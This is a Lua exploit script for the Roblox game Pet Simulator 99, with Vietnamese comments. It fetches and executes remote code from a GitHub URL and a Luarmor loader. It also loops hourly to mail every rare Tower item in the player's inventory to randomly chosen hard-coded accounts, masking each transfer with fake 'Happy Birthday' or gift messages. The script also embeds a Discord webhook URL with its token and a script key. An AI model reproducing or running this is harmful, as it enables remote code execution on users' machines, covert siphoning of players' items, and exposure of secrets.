loadstring(game:HttpGet("https://raw.githubusercontent.com/raidersvin/ps99vin/refs/heads/main/scriptphu"))()


-- Send event TOWER những con hiếm hơn để bán
task.spawn(function()

while true do

task.wait(1)
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer
local Client = ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client")
local SaveModule = require(Client:WaitForChild("Save"))
local Network = require(Client:WaitForChild("Network"))

local inventory = SaveModule.Get().Inventory.Tower or {}
local itemsToTrack = {
    {id = "Mechanical Griffin"},
	{id = "Zeus Bear"},
	{id = "Arcade Angelus"},
	{id = "Nightmare Cyclops"},
	{id = "Nuclear Dominus"},
	{id = "Rich Corgi"},
	{id = "Nightmare Cyclops"},
}


local recipients = {"sijmongirthss","1940Mosier3104","soystaylan5","dreddyewele60","1971Nowak3135"}

-- 🎲 Lấy username ngẫu nhiên
local randomIndex = math.random(1, #recipients)
local username = recipients[randomIndex]

local messages = {
    "Happy Birthday %s!",
    "Hope today brings %s!",
    "Wishing you luck %s!",
    "Congrats on your %s!",
    "Give away %s!",
    "You are amazing %s — here's a gift!"
}

local MAX_KEEP = 0

for _, item in ipairs(itemsToTrack) do
    local count = 0
    local uids = {}

    for uid, obj in pairs(inventory) do
        if obj.id == item.id or obj.name == item.id then
            local amount = obj._am or 1
            count += amount
            table.insert(uids, {uid = uid, amount = amount})
        end
    end

    warn("🧾 Đã tìm thấy:", count, item.id, "với", #uids, "UID.")

    local excess = count - MAX_KEEP
    if excess > 0 then
        warn("📦 Có", excess, "vật phẩm dư sẽ được gửi đi.")
        local remaining = excess
        for _, entry in ipairs(uids) do
            local sendAmount = math.min(entry.amount, remaining)
            if sendAmount > 0 then
				task.wait(3)
                warn("📤 Đang gửi", sendAmount, item.id, "UID:", entry.uid)
				local message = string.format(messages[math.random(1, #messages)], username)
                local success, err = Network.Invoke("Mailbox: Send", username, message, "Tower", entry.uid, 1)
                if success then
                    warn("✅ Đã gửi", sendAmount, item.id, "cho", username)
                else
                    warn("❌ Lỗi gửi:", err)
                end
                remaining -= sendAmount
                if remaining <= 0 then break end
            end
        end
    else
        warn("⚠️ Không có vật phẩm dư để gửi:", item.id)
    end
end


task.wait(3600)
end
end)


	local Players = game:GetService("Players")
	local player = Players.LocalPlayer

	while not player do
		task.wait(1)
		player = Players.LocalPlayer
	end


	local names = {"LegendPrismShadow201","MIA_Wraith60","ELIJAHMOON2019_YT","Jayd3nByt383","parmentminiecv","eraydaadamusp","affiegutterin9","asgeirtcledgy","lavafubughs","kellarkreiken50","mariamnevanschen70","hersindeayala25","vidyakeymer20","ebenhezepippel1","1943McLeod3107","LoganNovaChill","AriaCircuitBlaze","jessasergio22","WraithGlitch38","MinerPh0enix201957","GabrielRift2003YT","1947Groff3111","AceCyber36","Chl0eArr0w73","XxEmmaPrismInfern0xX","SKY_Lion92","CrystalThund3r89","VICT0RIA_Pixel2017","JamesNightT0xic","Rogu3Rid3rMin3r2008","1957Devore3121","WraithPulseBuilder20","XxZayd3nB3astSonicxX","MasonHyper201462","MinerEpicPro","FlameC0de2018","EpicFlam3Ic3","1948Simmons3112","Sparkly_Byte201215","LeviDriftKnight","1956McCollum3120","Aurora_POWER51","T0xic_Ninja2021YT","Fusi0nCraftC00kie201","KayleeStar2024","XxWillowSparkRid3rxX","Fury_ALPHA200764","CircuitCod394","etwitepluffyx","CHILL_Zap66","MasonSlim3Vort3x","NoahRift60","Hannah_Hunt3r2022","1952Fiore3116","NinjaStreamPixel","Her0SaberPrism96","BlastNinja22","XxG0ldenSparklyxX16","N0ahNe0n14","XxAmelia_CHAOSXX2016","1949McKnight3113","LIONBLAZEHERO2003_YT","XxMiaThunderxX26","Hero_Miner72","FireFr0stTiger2007","Fusi0nCrystal201969","HeroHawk40","pierautsundue86","AidenZeroRaven2004YT","yantungleggatt63","Dani3lPuls3Giga2011","AvaStarEagl3","XxT0xicKnightS0nicxX","EllaBane53","mayenkahan93","Charl0tteHawkByte","menkoludzer79","Pix3l_Blad384","CodeStarryDawn","lavinie91258","XxGalaxyEchoTigerxX","AidenCraft202228_YT","burchard6297","LuckyH3ro64","Layla_Dawn20","muoininfaui","XxEllie_GoldenxX2021","DarkClaw44_YT","karlo8266","ZeroFusion40"}

	local emails = {"mcconchifredjeyo","ecclweltst","killedsanthi85","tamuleviazulayv","hegemangaltieri81","fadile66096","sollarleats","bhosievvanister","pafnucymargit21","ghaldoun9247","feodslogeshy","holvastroaldf","bradodette49","34Jaret35","kapurvludi","St0rm_V0id57","1950Shipley3114","RiderZap85","NinjaPandaEcho2013"}

	local totalEmails = #emails

	local groupSize = totalEmails
	local found = false

	for i = 1, #names do
		if player.Name == names[i] then
			local indexInGroup = ((i - 1) % groupSize) + 1
			getgenv().GMAIL_RECEIVERS = { tostring(emails[indexInGroup]) }
			found = true
			break
		end
	end

	if not found then
		getgenv().GMAIL_RECEIVERS = {""}
		--warn("Tên người chơi không nằm trong danh sách hợp lệ.")
	end

getgenv().GMAIL_ITEMS = {


	["Mechanical Griffin"] = {Class = "Tower", Id = "Mechanical Griffin", MinAmount = 1},
	["Zeus Bear"] = {Class = "Tower", Id = "Zeus Bear", MinAmount = 1},
	["Arcade Angelus"] = {Class = "Tower", Id = "Arcade Angelus", MinAmount = 1},
	["Nightmare Cyclops"] = {Class = "Tower", Id = "Nightmare Cyclops", MinAmount = 1},
	["Nuclear Dominus"] = {Class = "Tower", Id = "Nuclear Dominus", MinAmount = 1},
	["Rich Corgi"] = {Class = "Tower", Id = "Rich Corgi", MinAmount = 1},
	["Nightmare Cyclops"] = {Class = "Tower", Id = "Nightmare Cyclops", MinAmount = 1},


	["MVP Key Upper Half"] = {Class = "Misc", Id = "MVP Key Upper Half", MinAmount = 30},	
	
	["Normal Ancestor Eagle"] = {Class = "Pet", Id = "Ancestor Eagle", MinAmount = 5},
	["Golden Ancestor Eagle"] = {Class = "Pet", Id = "Ancestor Eagle", MinAmount = 1, IsGold = true},
	["RB Ancestor Eagle"] = {Class = "Pet", Id = "Ancestor Eagle", MinAmount = 1, IsRainbow = true},
	["Shiny Normal Ancestor Eagle"] = {Class = "Pet", Id = "Ancestor Eagle", MinAmount = 1, IsShiny = true},
	["Shiny Golden Ancestor Eagle"] = {Class = "Pet", Id = "Ancestor Eagle", MinAmount = 1, IsGold = true, IsShiny = true},
	["Shiny RB Ancestor Eagle"] = {Class = "Pet", Id = "Ancestor Eagle", MinAmount = 1, IsRainbow = true, IsShiny = true},	
	
	
	["Daycare egg 5"] = {Class = "Egg", Id = "Huge Machine Egg 5", MinAmount = 1},
	["Secret pet1"] = {Class = "Pet", Id = "Rainbow Swirl", MinAmount = 1, AllVariants = true},
	["Secret pet2"] = {Class = "Pet", Id = "Banana", MinAmount = 1, AllVariants = true},
	["Secret pet3"] = {Class = "Pet", Id = "Coin", MinAmount = 1, AllVariants = true},
	["Secret pet4"] = {Class = "Pet", Id = "Yellow Lucky Block", MinAmount = 1, AllVariants = true},	

}

script_key = "IAMAiZhmvPSarFAwYGimVtcLzrqIAnAQ";

getgenv().GEVENT_FPS  = 3
getgenv().GGFX_MODE = 1
getgenv().GZONE_TO = 999
getgenv().GMAX_EGG_SLOTS = 99

--getgenv().GUSE_FLAGS = {"Coins Flag"}

getgenv().GPOTIONS = {"The Cocktail","Lucky"}
getgenv().GPOTIONS_MAX_TIER = 19
getgenv().GUSE_ULTIMATES = {"Tornado","Tsunami","Lightning Storm"}
getgenv().GHOLD_GIFTS = true
getgenv().GHOLD_BUNDLES = true
getgenv().GCONSUME_CHARMS = false
getgenv().GCLEAR_FAVORITE_PETS = true
getgenv().GLOOTBOXES = {"Locked Hype Egg"}	
------------------------------------------------

getgenv().GHATCH_CHARGED_EGGS = true
getgenv().GENCHANTS = {"Shiny Hunter","Lucky Eggs","Lucky Eggs","Lucky Eggs","Huge Hunter","Huge Hunter","Huge Hunter","Lucky Eggs","Lucky Eggs"}
getgenv().GDAYCARE = true
getgenv().GUSE_BOOSTS = true

getgenv().GDO_TOWER_DEFENSE = true

getgenv().GTOWER_DEFENSE_FUSE_PET = "Electric Eel"
getgenv().GTOWER_DEFENSE_INFINITY_PET = {"Electric Eel"}
----------------------------------------------

getgenv().GWEBHOOK_LINK = "https://discord.com/api/webhooks/1273112470063546511/A3X4m45OzJPNWyofdnEIeGJ__agFyAn-ILrF6Rv34Cu1NiywwlUbhthc7SIZux6eGPfo"
getgenv().GHUGE_COUNT = 500

loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/ba2dcad2127dcfc04301dfe52ce6c61c.lua"))()
